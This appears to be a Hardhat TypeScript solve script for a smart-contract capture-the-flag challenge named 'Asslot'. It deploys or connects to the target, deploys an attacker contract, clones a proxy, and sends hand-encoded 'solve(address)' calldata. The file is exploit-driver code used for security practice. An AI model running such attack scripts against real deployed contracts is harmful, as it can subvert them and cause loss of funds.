import chalk from "chalk";
import { ethers } from "hardhat";
import { Asslot__factory, AsslotAttack__factory } from "../../typechain";

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let asslotContract;
    let tx;
    if(network.name == "hardhat") {
        asslotContract = await new Asslot__factory(deployer).deploy();
        await asslotContract.waitForDeployment();
        asslotContract = asslotContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await asslotContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x53A2304b9E3d35B88D9344b08d4dE5De0C15DD42";
        asslotContract = Asslot__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await asslotContract.getAddress())}!`)
    }
    
    if(asslotContract) {
        const asslotAttack = await new AsslotAttack__factory(attacker).deploy();
        await asslotAttack.waitForDeployment();
        tx = await asslotAttack.clone();
        await tx.wait();
        const proxyAddress = await asslotAttack.proxyAddress();
        log(`Proxy contract address: ${proxyAddress}`);
        let coder = ethers.AbiCoder.defaultAbiCoder();
        let calldata = ethers.id("solve(address)").substring(0,10) + coder.encode(["address"], [await asslotContract.getAddress()]).substring(2);     
        tx = await attacker.sendTransaction({
            to: proxyAddress,
            data: calldata,
            gasLimit: 300000
        })
        await tx.wait();
        log(`Solved with transaction ${chalk.yellow(tx.hash)}`);
    }


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});